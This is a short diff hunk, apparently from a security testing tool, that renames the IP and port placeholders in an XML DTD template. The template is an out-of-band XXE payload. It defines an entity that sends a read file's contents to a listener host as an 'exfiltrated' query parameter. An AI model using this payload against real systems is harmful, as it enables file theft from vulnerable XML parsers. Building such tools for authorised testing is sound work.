@@ -1,3 +1,3 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://$localIp:$localPort/?exfiltrated=%file;'>">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://$local_ip:$local_port/?exfiltrated=%file;'>">
 %all;
 
